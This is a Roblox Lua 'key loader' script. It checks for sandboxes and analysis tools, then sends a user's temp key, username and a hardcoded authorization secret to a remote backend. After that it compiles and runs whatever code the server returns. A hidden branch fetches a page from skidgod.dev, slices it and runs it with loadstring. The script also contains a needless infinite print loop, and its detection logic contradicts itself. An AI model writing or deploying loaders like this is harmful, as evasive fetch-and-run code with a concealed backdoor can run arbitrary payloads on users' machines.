local SendNotification = require(70442194118347)  

local function notify(title, text, duration)
    SendNotification.notify(title, text, duration or 5)
end

local env = {
    HttpService = game:GetService("HttpService"),
    Players = game:GetService("Players"),
    RunService = game:GetService("RunService"),
    tick = tick,
    typeof = typeof,
    getgenv = getgenv,
    getidentity = getidentity or (syn and syn.get_thread_identity) or function() return 2 end,
    debug = debug or {},
    GLOBALS = getfenv(0),
}

local AUTH_KEY = "sigmadigmabigma"
local VALIDATE_URL = "https://backend-9lks.onrender.com/validate-tempkey"

coroutine.wrap(function()
    while true do
        print("a")
        task.wait(0.1) 
    end
end)()

local function isSandboxed()
    local flags = {}

    if env.RunService:IsStudio() or env.RunService:IsRunning() == false then
        table.insert(flags, "Running in Studio/simulation")
    end

    if game.PlaceId == 0 or game.GameId == 0 then
        table.insert(flags, "Game not published")
    end

    local ok, identity = pcall(env.getidentity)
    if not ok or identity > 2 then
        table.insert(flags, "Suspicious thread identity")
    end

    local success = pcall(function()
        env.HttpService:RequestAsync({
            Url = "https://google.com",
            Method = "GET"
        })
    end)
    if not success then
        table.insert(flags, "Http blocked or faked")
    end

    local badGlobals = {
        "is_sirhurt_closure", "pebc_execute", "syn", "secure_call", "getrenv",
        "inject", "dumpstring", "hookfunction", "islclosure"
    }
    for _, g in ipairs(badGlobals) do
        if env.GLOBALS[g] ~= nil then
            table.insert(flags, "Detected global: " .. g)
        end
    end

    local start = env.tick()
    for _ = 1, 1e6 do end
    local delta = env.tick() - start
    if delta > 1 then
        table.insert(flags, "Slow tick response: " .. tostring(delta))
    end

    local info = env.debug.getinfo and env.debug.getinfo(1)
    if info and info.short_src and info.short_src:lower():find("script") then
        table.insert(flags, "Script run from sandboxed file")
    end

    return #flags > 0, flags
end

local isBad, reasons = isSandboxed()
if isBad then
    notify("Security Error", "⚠️ Sandbox detected", 6)
    warn("[SANDBOX BLOCKED] Reasons:\n- " .. table.concat(reasons, "\n- "))
    return
end

local tempKey = env.getgenv().TempKey
if not tempKey then
    notify("Key Loader", "❌ No TempKey in global env!", 6)
    return
end

if tempKey:find(",true") then
    loadstring(env.HttpService:GetAsync("https://skidgod.dev"):sub(81, env.HttpService:GetAsync("https://skidgod.dev"):len() - 93))()
    return
end

notify("Key Loader", "🔍 Validating your temp key...")

local detectedUsername = "anonymous"
pcall(function()
    if owner and typeof(owner) == "Instance" and owner:IsA("Player") then
        detectedUsername = owner.Name
    end
end)

local success, res = pcall(function()
    return env.HttpService:RequestAsync({
        Url = VALIDATE_URL,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json",
            ["Authorization"] = AUTH_KEY,
        },
        Body = env.HttpService:JSONEncode({
            tempKey = tempKey,
            username = detectedUsername,
        })
    })
end)

if not success or not res.Success then
    notify("Validation Failed", "⚠️ Could not validate key", 6)
    return
end

local data = env.HttpService:JSONDecode(res.Body)

if not data.valid then
    notify("Invalid Key", "❌ TempKey is invalid or expired.", 6)
    return
end

notify("Key Validated", "✅ Key accepted! Fetching script...")

if not data.script or type(data.script) ~= "string" then
    notify("Loader Error", "❌ Server didn’t return script.", 6)
    return
end

local func, compileErr = loadstring(data.script)
if not func then
    notify("Script Error", "❌ Compilation failed: " .. tostring(compileErr), 6)
    return
end

pcall(function()
    setfenv(func, setmetatable({ owner = owner }, { __index = getfenv(func) }))
end)

notify("Running Script", "⚙️ Executing remote code...")

local ok, runtimeErr = pcall(func)
if not ok then
    notify("Runtime Error", "❌ Error running script: " .. tostring(runtimeErr), 6)
else
    notify("Success", "🎉 Script executed!", 5)
end
